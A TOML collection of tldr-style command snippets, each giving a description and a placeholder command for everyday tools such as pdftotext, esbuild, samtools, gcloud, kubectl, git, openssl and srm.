[[snippets]]
  description = "Convert a graph using `stdin` and `stdout`"
  command = "cat <input.gv> | gv2gxl > <output.gxl>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gv2gxl -?"
  output = ""

[[snippets]]
  description = "View documentation for the current command"
  command = "tldr pamtotiff"
  output = ""

[[snippets]]
  description = "Validate a specific file"
  command = "html5validator <path/to/file>"
  output = ""

[[snippets]]
  description = "Validate all HTML files in a specific directory"
  command = "html5validator --root <path/to/directory>"
  output = ""

[[snippets]]
  description = "Show warnings as well as errors"
  command = "html5validator --show-warnings <path/to/file>"
  output = ""

[[snippets]]
  description = "Match multiple files using a glob pattern"
  command = "html5validator --root <path/to/directory> --match ""<*.html *.php>"""
  output = ""

[[snippets]]
  description = "Ignore specific directory names"
  command = "html5validator --root <path/to/directory> --blacklist ""<node_modules vendor>"""
  output = ""

[[snippets]]
  description = "Output the results in a specific format"
  command = "html5validator --format <gnu|xml|json|text> <path/to/file>"
  output = ""

[[snippets]]
  description = "Output the log at a specific verbosity level"
  command = "html5validator --root <path/to/directory> --log <debug|info|warning>"
  output = ""

[[snippets]]
  description = "Convert `filename.pdf` to plain text and print it to `stdout`"
  command = "pdftotext <filename.pdf> -"
  output = ""

[[snippets]]
  description = "Convert `filename.pdf` to plain text and save it as `filename.txt`"
  command = "pdftotext <filename.pdf>"
  output = ""

[[snippets]]
  description = "Convert `filename.pdf` to plain text and preserve the layout"
  command = "pdftotext -layout <filename.pdf>"
  output = ""

[[snippets]]
  description = "Convert `input.pdf` to plain text and save it as `output.txt`"
  command = "pdftotext <input.pdf> <output.txt>"
  output = ""

[[snippets]]
  description = "Convert pages 2, 3 and 4 of `input.pdf` to plain text and save them as `output.txt`"
  command = "pdftotext -f <2> -l <4> <input.pdf> <output.txt>"
  output = ""

[[snippets]]
  description = "Convert a SIR image to a PNM file"
  command = "sirtopnm <path/to/input.sir> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Start a wizard to choose what kind of code (e.g. module, service, form, etc.) to generate"
  command = "dcg"
  output = ""

[[snippets]]
  description = "Directly specify the kind of code to generate"
  command = "dcg <service|plugin|theme|module|form>"
  output = ""

[[snippets]]
  description = "Generate the code in a specific directory"
  command = "dcg --directory <path/to/directory>"
  output = ""

[[snippets]]
  description = "Encrypt a directory into `archive.gpg` using a passphrase"
  command = "gpg-zip --symmetric --output <archive.gpg> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Decrypt `archive.gpg` into a directory of the same name"
  command = "gpg-zip --decrypt <path/to/archive.gpg>"
  output = ""

[[snippets]]
  description = "List the contents of the encrypted `archive.gpg`"
  command = "gpg-zip --list-archive <path/to/archive.gpg>"
  output = ""

[[snippets]]
  description = "Move the specified virtual machine to the current location"
  command = "VBoxManage movevm <vm_name>"
  output = ""

[[snippets]]
  description = "Specify the new location (full or relative pathname) of the virtual machine"
  command = "VBoxManage movevm <vm_name> --folder <path/to/new_location>"
  output = ""

[[snippets]]
  description = "Increase/decrease the priority of a running [p]rocess"
  command = "renice -n <3> -p <pid>"
  output = ""

[[snippets]]
  description = "Increase/decrease the priority of all processes owned by a [u]ser"
  command = "renice -n <-4> -u <uid|user>"
  output = ""

[[snippets]]
  description = "Increase/decrease the priority of all processes that belong to a process [g]roup"
  command = "renice -n <5> -g <process_group>"
  output = ""

[[snippets]]
  description = "Run a `doctl databases firewalls` command with an access token"
  command = "doctl databases firewalls <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Retrieve a list of firewall rules for a given database"
  command = "doctl databases firewalls list"
  output = ""

[[snippets]]
  description = "Add a database firewall rule to a given database"
  command = "doctl databases firewalls append <database_id> --rule <droplet|k8s|ip_addr|tag|app>:<value>"
  output = ""

[[snippets]]
  description = "Remove a firewall rule for a given database"
  command = "doctl databases firewalls remove <database_id> <rule_uuid>"
  output = ""

[[snippets]]
  description = "Strip nondeterministic information from a file"
  command = "strip-nondeterminism <path/to/file>"
  output = ""

[[snippets]]
  description = "Strip nondeterministic information from a file manually specifying the filetype"
  command = "strip-nondeterminism --type <filetype> <path/to/file>"
  output = ""

[[snippets]]
  description = "Strip nondeterministic information from a file; instead of removing timestamps set them to the specified UNIX timestamp"
  command = "strip-nondeterminism --timestamp <unix_timestamp> <path/to/file>"
  output = ""

[[snippets]]
  description = "Launch the program"
  command = "audacious"
  output = ""

[[snippets]]
  description = "Enqueue a specific directory of audio files"
  command = "audacious --enqueue <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start or stop playback"
  command = "audacious --play-pause"
  output = ""

[[snippets]]
  description = "Skip forwards or backwards in the playlist"
  command = "audacious --<fwd|rew>"
  output = ""

[[snippets]]
  description = "Stop playback"
  command = "audacious --stop"
  output = ""

[[snippets]]
  description = "Start a headless version"
  command = "audacious --headless"
  output = ""

[[snippets]]
  description = "Exit as soon as playback stops or there is nothing to playback"
  command = "audacious --quit-after-play"
  output = ""

[[snippets]]
  description = "Create a new organization"
  command = "pio org create <organization_name>"
  output = ""

[[snippets]]
  description = "Delete an organization"
  command = "pio org destroy <organization_name>"
  output = ""

[[snippets]]
  description = "Add a user to an organization"
  command = "pio org add <organization_name> <username>"
  output = ""

[[snippets]]
  description = "Remove a user from an organization"
  command = "pio org remove <organization_name> <username>"
  output = ""

[[snippets]]
  description = "List all organizations the current user is a member of and their owners"
  command = "pio org list"
  output = ""

[[snippets]]
  description = "Update the name, email or display name of an organization"
  command = "pio org update --orgname <new_organization_name> --email <new_email> --displayname <new_display_name> <organization_name>"
  output = ""

[[snippets]]
  description = "Execute the binary from a given npm module"
  command = "pnpx <module_name>"
  output = ""

[[snippets]]
  description = "Execute a specific binary from a given npm module, in case the module has multiple binaries"
  command = "pnpx --package <package_name> <module_name>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "pnpx --help"
  output = ""

[[snippets]]
  description = "Invert the colors or greyscale values in a PNM image"
  command = "pnminvert <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Run glow and select a file to view"
  command = "glow"
  output = ""

[[snippets]]
  description = "Render a Markdown file to the terminal"
  command = "glow <path/to/file>"
  output = ""

[[snippets]]
  description = "View a Markdown file using a paginator"
  command = "glow -p <path/to/file>"
  output = ""

[[snippets]]
  description = "View a file from a URL"
  command = "glow <https://example.com/file.md>"
  output = ""

[[snippets]]
  description = "View a GitHub/GitLab README"
  command = "glow <github.com/owner/repository>"
  output = ""

[[snippets]]
  description = "Start GUI"
  command = "telegram-desktop"
  output = ""

[[snippets]]
  description = "Run GUI as an autostart if allowed"
  command = "telegram-desktop -autostart"
  output = ""

[[snippets]]
  description = "Run GUI minimized to tray"
  command = "telegram-desktop -startintray"
  output = ""

[[snippets]]
  description = "Start up a project"
  command = "ddev start"
  output = ""

[[snippets]]
  description = "Configure a project's type and docroot"
  command = "ddev config"
  output = ""

[[snippets]]
  description = "[f]ollow the log trail"
  command = "ddev logs -f"
  output = ""

[[snippets]]
  description = "Run composer within the container"
  command = "ddev composer"
  output = ""

[[snippets]]
  description = "Install a specific Node.js version"
  command = "ddev nvm install <version>"
  output = ""

[[snippets]]
  description = "Export a database"
  command = "ddev export-db --file=</tmp/db.sql.gz>"
  output = ""

[[snippets]]
  description = "Run a specific command within a container"
  command = "ddev exec <echo 1>"
  output = ""

[[snippets]]
  description = "Display information on all available GPUs and processes using them"
  command = "nvidia-smi"
  output = ""

[[snippets]]
  description = "Display more detailed GPU information"
  command = "nvidia-smi --query"
  output = ""

[[snippets]]
  description = "Monitor overall GPU usage with 1-second update interval"
  command = "nvidia-smi dmon"
  output = ""

[[snippets]]
  description = "Bundle a JavaScript application and print to `stdout`"
  command = "esbuild --bundle <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Bundle a JSX application from `stdin`"
  command = "esbuild --bundle --outfile=<path/to/out.js> < <path/to/file.jsx>"
  output = ""

[[snippets]]
  description = "Bundle and minify a JSX application with source maps in `production` mode"
  command = "esbuild --bundle --define:<process.env.NODE_ENV=\""production\""> --minify --sourcemap <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Bundle a JSX application for a comma-separated list of browsers"
  command = "esbuild --bundle --minify --sourcemap --target=<chrome58,firefox57,safari11,edge16> <path/to/file.jsx>"
  output = ""

[[snippets]]
  description = "Bundle a JavaScript application for a specific node version"
  command = "esbuild --bundle --platform=<node> --target=<node12> <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Bundle a JavaScript application enabling JSX syntax in `.js` files"
  command = "esbuild --bundle app.js --loader:<.js=jsx> <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Bundle and serve a JavaScript application on an HTTP server"
  command = "esbuild --bundle --serve=<port> --outfile=<index.js> <path/to/file.js>"
  output = ""

[[snippets]]
  description = "Bundle a list of files to an output directory"
  command = "esbuild --bundle --outdir=<path/to/output_directory> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Parse the contents of a URL or file"
  command = "nokogiri <url|path/to/file>"
  output = ""

[[snippets]]
  description = "Parse as a specific type"
  command = "nokogiri <url|path/to/file> --type <xml|html>"
  output = ""

[[snippets]]
  description = "Load a specific initialization file before parsing"
  command = "nokogiri <url|path/to/file> -C <path/to/config_file>"
  output = ""

[[snippets]]
  description = "Parse using a specific encoding"
  command = "nokogiri <url|path/to/file> --encoding <encoding>"
  output = ""

[[snippets]]
  description = "Validate using a RELAX NG file"
  command = "nokogiri <url|path/to/file> --rng <url|path/to/file>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "ipython"
  output = ""

[[snippets]]
  description = "Enter an interactive IPython session after running a Python script"
  command = "ipython -i <script.py>"
  output = ""

[[snippets]]
  description = "Create default IPython profile"
  command = "ipython profile create"
  output = ""

[[snippets]]
  description = "Print the path to the directory for the default IPython profile"
  command = "ipython locate profile"
  output = ""

[[snippets]]
  description = "Clear the IPython history database, deleting all entries"
  command = "ipython history clear"
  output = ""

[[snippets]]
  description = "Register `gcloud` as a Docker credential helper"
  command = "gcloud auth configure-docker"
  output = ""

[[snippets]]
  description = "Create a cluster to run GKE containers"
  command = "gcloud container clusters create <cluster_name>"
  output = ""

[[snippets]]
  description = "List clusters for running GKE containers"
  command = "gcloud container clusters list"
  output = ""

[[snippets]]
  description = "Update kubeconfig to get `kubectl` to use a GKE cluster"
  command = "gcloud container clusters get-credentials <cluster_name>"
  output = ""

[[snippets]]
  description = "List tag and digest metadata for a container image"
  command = "gcloud container images list-tags <image>"
  output = ""

[[snippets]]
  description = "Generate Go files by running commands within source files"
  command = "go generate"
  output = ""

[[snippets]]
  description = "Interactively select a run to see information about the jobs"
  command = "gh run view"
  output = ""

[[snippets]]
  description = "Display information about a specific run"
  command = "gh run view <workflow_run_number>"
  output = ""

[[snippets]]
  description = "Display information about the steps of a job"
  command = "gh run view --job=<job_number>"
  output = ""

[[snippets]]
  description = "Display the log of a job"
  command = "gh run view --job=<job_number> --log"
  output = ""

[[snippets]]
  description = "Check a specific workflow and exit with a non-zero status if the run failed"
  command = "gh run view <workflow_run_number> --exit-status && <echo ""run pending or passed"">"
  output = ""

[[snippets]]
  description = "Interactively select an active run and wait until it's done"
  command = "gh run watch"
  output = ""

[[snippets]]
  description = "Display the jobs for a run and wait until it's done"
  command = "gh run watch <workflow_run_number>"
  output = ""

[[snippets]]
  description = "Re-run a specific workflow"
  command = "gh run rerun <workflow_run_number>"
  output = ""

[[snippets]]
  description = "Convert a SAM input file to BAM stream and save to file"
  command = "samtools view -S -b <input.sam> > <output.bam>"
  output = ""

[[snippets]]
  description = "Take input from `stdin` (-) and print the SAM header and any reads overlapping a specific region to `stdout`"
  command = "<other_command> | samtools view -h - chromosome:start-end"
  output = ""

[[snippets]]
  description = "Sort file and save to BAM (the output format is automatically determined from the output file's extension)"
  command = "samtools sort <input> -o <output.bam>"
  output = ""

[[snippets]]
  description = "Index a sorted BAM file (creates `sorted_input.bam.bai`)"
  command = "samtools index <sorted_input.bam>"
  output = ""

[[snippets]]
  description = "Print alignment statistics about a file"
  command = "samtools flagstat <sorted_input>"
  output = ""

[[snippets]]
  description = "Count alignments to each index (chromosome/contig)"
  command = "samtools idxstats <sorted_indexed_input>"
  output = ""

[[snippets]]
  description = "Merge multiple files"
  command = "samtools merge <output> <input1 input2 ...>"
  output = ""

[[snippets]]
  description = "Split input file according to read groups"
  command = "samtools split <merged_input>"
  output = ""

[[snippets]]
  description = "Display properties about a specific file such as size, permissions, creation and access dates among others"
  command = "stat <path/to/file>"
  output = ""

[[snippets]]
  description = "Display properties about a specific file such as size, permissions, creation and access dates among others without labels"
  command = "stat --terse <path/to/file>"
  output = ""

[[snippets]]
  description = "Display information about the filesystem where a specific file is located"
  command = "stat --file-system <path/to/file>"
  output = ""

[[snippets]]
  description = "Show only octal file permissions"
  command = "stat --format=""%a %n"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Show the owner and group of a specific file"
  command = "stat --format=""%U %G"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Show the size of a specific file in bytes"
  command = "stat --format=""%s %n"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Import a BSON data dump from a directory to a MongoDB database"
  command = "mongorestore --db <database_name> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Import a BSON data dump from a directory to a given database in a MongoDB server host, running at a given port, with user authentication (user will be prompted for password)"
  command = "mongorestore --host <database_host:port> --db <database_name> --username <username> <path/to/directory> --password"
  output = ""

[[snippets]]
  description = "Import a collection from a BSON file to a MongoDB database"
  command = "mongorestore --db <database_name> <path/to/file>"
  output = ""

[[snippets]]
  description = "Import a collection from a BSON file to a given database in a MongoDB server host, running at a given port, with user authentication (user will be prompted for password)"
  command = "mongorestore --host <database_host:port> --db <database_name> --username <username> <path/to/file> --password"
  output = ""

[[snippets]]
  description = "Show the system stats dashboard"
  command = "gtop"
  output = ""

[[snippets]]
  description = "Sort by CPU usage"
  command = "c"
  output = ""

[[snippets]]
  description = "Sort by memory usage"
  command = "m"
  output = ""

[[snippets]]
  description = "Convert a PBM image to an Andrew Toolkit raster object"
  command = "pbmtoatk <path/to/image.pbm> > <path/to/output.atk>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr limactl"
  output = ""

[[snippets]]
  description = "Compile a NSIS script"
  command = "makensis <path/to/file.nsi>"
  output = ""

[[snippets]]
  description = "Compile a NSIS script in strict mode (treat warnings as errors)"
  command = "makensis -WX <path/to/file.nsi>"
  output = ""

[[snippets]]
  description = "Display help for a specific command"
  command = "makensis -CMDHELP <command>"
  output = ""

[[snippets]]
  description = "Run a Shadowsocks proxy by specifying the host, server port, local port, password, and encryption method"
  command = "ss-local -s <host> -p <server_port> -l <local port> -k <password> -m <encrypt_method>"
  output = ""

[[snippets]]
  description = "Run a Shadowsocks proxy by specifying the configuration file"
  command = "ss-local -c <path/to/config/file.json>"
  output = ""

[[snippets]]
  description = "Use a plugin to run the proxy client"
  command = "ss-local --plugin <plugin_name> --plugin-opts <plugin_options>"
  output = ""

[[snippets]]
  description = "Enable TCP fast open"
  command = "ss-local --fast-open"
  output = ""

[[snippets]]
  description = "Generate the PPM image as output for an Atari Neochrome NEO file as input"
  command = "neotoppm <path/to/file.neo>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "neotoppm -version"
  output = ""

[[snippets]]
  description = "Create an image from a file using default settings"
  command = "carbon-now <path/to/file>"
  output = ""

[[snippets]]
  description = "Create an image from a text in clipboard using default settings"
  command = "carbon-now --from-clipboard"
  output = ""

[[snippets]]
  description = "Create an image from `stdin` using default settings and copy to the clipboard"
  command = "<input> | carbon-now --to-clipboard"
  output = ""

[[snippets]]
  description = "Create images [i]nteractively for custom settings and optionally save a preset"
  command = "carbon-now -i <path/to/file>"
  output = ""

[[snippets]]
  description = "Create images from a previously saved [p]reset"
  command = "carbon-now -p <preset> <path/to/file>"
  output = ""

[[snippets]]
  description = "[s]tart at a specified line of text"
  command = "carbon-now -s <line> <path/to/file>"
  output = ""

[[snippets]]
  description = "[e]nd at a specific line of text"
  command = "carbon-now -e <line> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open image in a browser instead of saving"
  command = "carbon-now --open <path/to/file>"
  output = ""

[[snippets]]
  description = "Generate a new Hakyll sample blog"
  command = "hakyll-init <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "hakyll-init --help"
  output = ""

[[snippets]]
  description = "Download a track or playlist"
  command = "deemix <https://www.deezer.com/us/track/00000000>"
  output = ""

[[snippets]]
  description = "Download track/playlist at a specific bitrate"
  command = "deemix --bitrate <FLAC|MP3> <url>"
  output = ""

[[snippets]]
  description = "Download to a specific path"
  command = "deemix --bitrate <bitrate> --path <path> <url>"
  output = ""

[[snippets]]
  description = "Create a portable deemix configuration file in the current directory"
  command = "deemix --portable --bitrate <bitrate> --path <path> <url>"
  output = ""

[[snippets]]
  description = "Compile and run sequential Erlang program as a common script and then exit"
  command = "erlc <path/to/file1 path/to/file2 ...> && erl -noshell '<mymodule:myfunction(arguments)>, init:stop().'"
  output = ""

[[snippets]]
  description = "Connect to a running Erlang node"
  command = "erl -remsh <nodename>@<hostname> -sname <custom_shortname> -hidden -setcookie <cookie_of_remote_node>"
  output = ""

[[snippets]]
  description = "Tell the Erlang shell to load modules from a directory"
  command = "erl -pa <path/to/directory_with_beam_files>"
  output = ""

[[snippets]]
  description = "Count all the lines of code in a directory"
  command = "cloc <path/to/directory>"
  output = ""

[[snippets]]
  description = "Count all the lines of code in a directory, displaying a progress bar during the counting process"
  command = "cloc --progress=1 <path/to/directory>"
  output = ""

[[snippets]]
  description = "Compare 2 directory structures and count the differences between them"
  command = "cloc --diff <path/to/directory/one> <path/to/directory/two>"
  output = ""

[[snippets]]
  description = "Ignore files that are ignored by VCS, such as files specified in `.gitignore`"
  command = "cloc --vcs git <path/to/directory>"
  output = ""

[[snippets]]
  description = "Count all the lines of code in a directory, displaying the results for each file instead of each language"
  command = "cloc --by-file <path/to/directory>"
  output = ""

[[snippets]]
  description = "Convert numeric bytes value to a human-readable string"
  command = "pretty-bytes <1337>"
  output = ""

[[snippets]]
  description = "Convert numeric bytes value from `stdin` to a human-readable string"
  command = "echo <1337> | pretty-bytes"
  output = ""

[[snippets]]
  description = "Display help"
  command = "pretty-bytes --help"
  output = ""

[[snippets]]
  description = "Convert a PAM image to a TIFF image"
  command = "pamtotiff <path/to/input_file.pam> > <path/to/output_file.tiff>"
  output = ""

[[snippets]]
  description = "Explicitly specify a compression method for the output file"
  command = "pamtotiff -<none|packbits|lzw|g3|g4|flate|adobeflate> <path/to/input_file.pam> > <path/to/output_file.tiff>"
  output = ""

[[snippets]]
  description = "Always produce a color TIFF image, even if the input image is greyscale"
  command = "pamtotiff -color <path/to/input_file.pam> > <path/to/output_file.tiff>"
  output = ""

[[snippets]]
  description = "Use a specific audio driver"
  command = "musescore --audio-driver <jack|alsa|portaudio|pulse>"
  output = ""

[[snippets]]
  description = "Set the MP3 output bitrate in kbit/s"
  command = "musescore --bitrate <bitrate>"
  output = ""

[[snippets]]
  description = "Start MuseScore in debug mode"
  command = "musescore --debug"
  output = ""

[[snippets]]
  description = "Enable experimental features, such as layers"
  command = "musescore --experimental"
  output = ""

[[snippets]]
  description = "Export the given file to the specified output file. The file type depends on the given extension"
  command = "musescore --export-to <output_file> <input_file>"
  output = ""

[[snippets]]
  description = "Print a diff between the given scores"
  command = "musescore --diff <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Specify a MIDI import operations file"
  command = "musescore --midi-operations <path/to/file>"
  output = ""

[[snippets]]
  description = "Lookup the IP(s) associated with a hostname (A records)"
  command = "kdig <example.com>"
  output = ""

[[snippets]]
  description = "Specify a specific DNS server to query (e.g. Google DNS)"
  command = "kdig <example.com> @<8.8.8.8>"
  output = ""

[[snippets]]
  description = "Query a specific DNS record type associated with a given domain name"
  command = "kdig <example.com> <A|AAAA|NS|SOA|DNSKEY|ANY>"
  output = ""

[[snippets]]
  description = "Lookup the IP(s) associated with a hostname (A records) using DNS over TLS (DoT)"
  command = "kdig -d @<8.8.8.8> +tls-ca +tls-host=<dns.google> <example.com>"
  output = ""

[[snippets]]
  description = "Lookup the IP(s) associated with a hostname (A records) using DNS over HTTPS (DoH)"
  command = "kdig -d @<1.1.1.1> +https +tls-hostname=<1dot1dot1dot1.cloudflare-dns.com> <example.com>"
  output = ""

[[snippets]]
  description = "Uninstall a package"
  command = "pip uninstall <package>"
  output = ""

[[snippets]]
  description = "Uninstall packages listed in a specific file"
  command = "pip uninstall --requirement <path/to/requirements.txt>"
  output = ""

[[snippets]]
  description = "Uninstall package without asking for confirmation"
  command = "pip uninstall --yes <package>"
  output = ""

[[snippets]]
  description = "Download a torrent"
  command = "deluge <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Download a torrent using a specific configuration file"
  command = "deluge -c <path/to/configuration_file> <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Download a torrent and launch the specified user interface"
  command = "deluge -u <gtk|web|console> <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Download a torrent and output the log to a file"
  command = "deluge -l <path/to/log_file> <url|magnet|path/to/file>"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "pipenv"
  output = ""

[[snippets]]
  description = "Create a new project using Python 3"
  command = "pipenv --three"
  output = ""

[[snippets]]
  description = "Install a package"
  command = "pipenv install <package>"
  output = ""

[[snippets]]
  description = "Install all the dependencies for a project"
  command = "pipenv install"
  output = ""

[[snippets]]
  description = "Install all the dependencies for a project (including dev packages)"
  command = "pipenv install --dev"
  output = ""

[[snippets]]
  description = "Uninstall a package"
  command = "pipenv uninstall <package>"
  output = ""

[[snippets]]
  description = "Start a shell within the created virtual environment"
  command = "pipenv shell"
  output = ""

[[snippets]]
  description = "Generate a `requirements.txt` (list of dependencies) for a project"
  command = "pipenv lock --requirements"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr hping3"
  output = ""

[[snippets]]
  description = "Run a `doctl databases db` command with an access token"
  command = "doctl databases db <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Retrieve the name of the given database hosted in the given database cluster"
  command = "doctl databases db get <database_id> <database_name>"
  output = ""

[[snippets]]
  description = "List existing databases hosted within a given database cluster"
  command = "doctl databases db list <database_id>"
  output = ""

[[snippets]]
  description = "Create a database with the given name in the given database cluster"
  command = "doctl databases db create <database_id> <database_name>"
  output = ""

[[snippets]]
  description = "Delete the database with the given name in the given database cluster"
  command = "doctl databases db delete <database_id> <database_name>"
  output = ""

[[snippets]]
  description = "Switch to superuser (requires the root password)"
  command = "su"
  output = ""

[[snippets]]
  description = "Switch to a given user (requires the user's password)"
  command = "su <username>"
  output = ""

[[snippets]]
  description = "Switch to a given user and simulate a full login shell"
  command = "su - <username>"
  output = ""

[[snippets]]
  description = "Execute a command as another user"
  command = "su - <username> -c ""<command>"""
  output = ""

[[snippets]]
  description = "Authenticate a user and obtain a ticket-granting ticket"
  command = "kinit <username>"
  output = ""

[[snippets]]
  description = "Renew a ticket-granting ticket"
  command = "kinit -R"
  output = ""

[[snippets]]
  description = "Specify a lifetime for the ticket"
  command = "kinit -l <5h>"
  output = ""

[[snippets]]
  description = "Specify a total renewable lifetime for the ticket"
  command = "kinit -r <1w>"
  output = ""

[[snippets]]
  description = "Specify a different principal name to authenticate as"
  command = "kinit -p <principal@REALM>"
  output = ""

[[snippets]]
  description = "Specify a different keytab file to authenticate with"
  command = "kinit -t <path/to/keytab>"
  output = ""

[[snippets]]
  description = "Remove unused variables from a single file and display the diff"
  command = "autoflake --remove-unused-variables <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Remove unused imports from multiple files and display the diffs"
  command = "autoflake --remove-all-unused-imports <path/to/file1.py path/to/file2.py ...>"
  output = ""

[[snippets]]
  description = "Remove unused variables from a file, overwriting the file"
  command = "autoflake --remove-unused-variables --in-place <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Remove unused variables recursively from all files in a directory, overwriting each file"
  command = "autoflake --remove-unused-variables --in-place --recursive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search for a keyword using a regular expression"
  command = "apropos <regular_expression>"
  output = ""

[[snippets]]
  description = "Search without restricting the output to the terminal width ([l]ong output)"
  command = "apropos -l <regular_expression>"
  output = ""

[[snippets]]
  description = "Search for pages that match [a]ll the expressions given"
  command = "apropos <regular_expression_1> -a <regular_expression_2> -a <regular_expression_3>"
  output = ""

[[snippets]]
  description = "Convert a graph from `gml` to `gv` format"
  command = "graphml2gv -o <output.gv> <input.gml>"
  output = ""

[[snippets]]
  description = "Convert a graph using `stdin` and `stdout`"
  command = "cat <input.gml> | graphml2gv > <output.gv>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "graphml2gv -?"
  output = ""

[[snippets]]
  description = "Generate client codes when a project is in `$GOPATH`"
  command = "kitex <path/to/IDL_file.thrift>"
  output = ""

[[snippets]]
  description = "Generate client codes when a project is not in `$GOPATH`"
  command = " kitex -module <github.com/xx-org/xx-name> <path/to/IDL_file.thrift>"
  output = ""

[[snippets]]
  description = "Generate client codes with protobuf IDL"
  command = "kitex -type protobuf <path/to/IDL_file.proto>"
  output = ""

[[snippets]]
  description = "Generate server codes"
  command = "kitex -service <svc_name> <path/to/IDL_file.thrift>"
  output = ""

[[snippets]]
  description = "Trim whitespace from a file"
  command = "cat <path/to/file> | git stripspace"
  output = ""

[[snippets]]
  description = "Trim whitespace and Git comments from a file"
  command = "cat <path/to/file> | git stripspace --strip-comments"
  output = ""

[[snippets]]
  description = "Convert all lines in a file into Git comments"
  command = "git stripspace --comment-lines < <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove a file after a single-pass overwriting with random data"
  command = "srm -s <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove a file after seven passes of overwriting with random data"
  command = "srm -m <path/to/file>"
  output = ""

[[snippets]]
  description = "Recursively remove a directory and its contents overwriting each file with a single-pass of random data"
  command = "srm -r -s <path/to/directory>"
  output = ""

[[snippets]]
  description = "Prompt before every removal"
  command = "srm -i <\*>"
  output = ""

[[snippets]]
  description = "Generate an RSA private key of 2048 bits, saving it to a specific file"
  command = "openssl genpkey -algorithm rsa -pkeyopt rsa_keygen_bits:<2048> -out <filename.key>"
  output = ""

[[snippets]]
  description = "Generate an elliptic curve private key using the curve `prime256v1`, saving it to a specific file"
  command = "openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:<prime256v1> -out <filename.key>"
  output = ""

[[snippets]]
  description = "Generate an `ED25519` elliptic curve private key, saving it to a specific file"
  command = "openssl genpkey -algorithm <ED25519> -out <filename.key>"
  output = ""

[[snippets]]
  description = "Scale a replica set"
  command = "kubectl scale --replicas=<number_of_replicas> rs/<replica_name>"
  output = ""

[[snippets]]
  description = "Scale a resource identified by a file"
  command = "kubectl scale --replicas=<number_of_replicas> -f <path/to/file.yml>"
  output = ""

[[snippets]]
  description = "Scale a deployment based on current number of replicas"
  command = "kubectl scale --current-replicas=<current_replicas> --replicas=<number_of_replicas> deployment/<deployment_name>"
  output = ""

[[snippets]]
  description = "Store a reference by a name"
  command = "git symbolic-ref refs/<name> <ref>"
  output = ""

[[snippets]]
  description = "Store a reference by name, including a message with a reason for the update"
  command = "git symbolic-ref -m ""<message>"" refs/<name> refs/heads/<branch_name>"
  output = ""

[[snippets]]
  description = "Read a reference by name"
  command = "git symbolic-ref refs/<name>"
  output = ""

[[snippets]]
  description = "Delete a reference by name"
  command = "git symbolic-ref --delete refs/<name>"
  output = ""

[[snippets]]
  description = "For scripting, hide errors with `--quiet` and use `--short` to simplify ("refs/heads/X" prints as "X")"
  command = "git symbolic-ref --quiet --short refs/<name>"
  output = ""

[[snippets]]
  description = "Display help about using `gh` with MinTTY"
  command = "gh mintty"
  output = ""

[[snippets]]
  description = "Compare the working directory with a specific commit"
  command = "git diff-index <commit>"
  output = ""

[[snippets]]
  description = "Compare a specific file or directory in working directory with a commit"
  command = "git diff-index <commit> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Compare the working directory with the index (staging area) to check for staged changes"
  command = "git diff-index --cached <commit>"
  output = ""

[[snippets]]
  description = "Suppress output and return an exit status to check for differences"
  command = "git diff-index --quiet <commit>"
  output = ""

[[snippets]]
  description = "Show file information"
  command = "osmium fileinfo <path/to/input.osm>"
  output = ""

[[snippets]]
  description = "Display contents"
  command = "osmium show <path/to/input.osm>"
  output = ""

[[snippets]]
  description = "Convert file format from PBF into XML"
  command = "osmium cat <path/to/input.osm.pbf> -o <path/to/output.osm>"
  output = ""

[[snippets]]
  description = "Extract a geographic region by the given [b]ounding box"
  command = "osmium extract -b <min_longitude>,<min_latitude>,<max_longitude>,<max_latitude> <path/to/input.pbf> -o <path/to/output.pbf>"
  output = ""

[[snippets]]
  description = "Extract a geographic region by a GeoJSON file"
  command = "osmium extract -p <path/to/polygon.geojson> <path/to/input.pbf> -o <path/to/output.pbf>"
  output = ""

[[snippets]]
  description = "Filter all objects tagged as "restaurant""
  command = "osmium tags-filter <path/to/input.pbf> amenity=restaurant -o <path/to/output.pbf>"
  output = ""

[[snippets]]
  description = "Filter for "way" objects tagged as "highway""
  command = "osmium tags-filter <path/to/input.pbf> w/highway -o <path/to/output.pbf>"
  output = ""

[[snippets]]
  description = "Filter "way" and "relation" objects tagged as "building""
  command = "osmium tags-filter <path/to/input.pbf> wr/building -o <path/to/output.pbf>"
  output = ""

[[snippets]]
  description = "Start a GUI for `tlmgr`"
  command = "sudo tlmgr gui"
  output = ""

[[snippets]]
  description = "Start a GUI specifying the background color"
  command = "sudo tlmgr gui -background ""<#f39bc3>"""
  output = ""

[[snippets]]
  description = "Start a GUI specifying the foreground color"
  command = "sudo tlmgr gui -foreground ""<#0ef3bd>"""
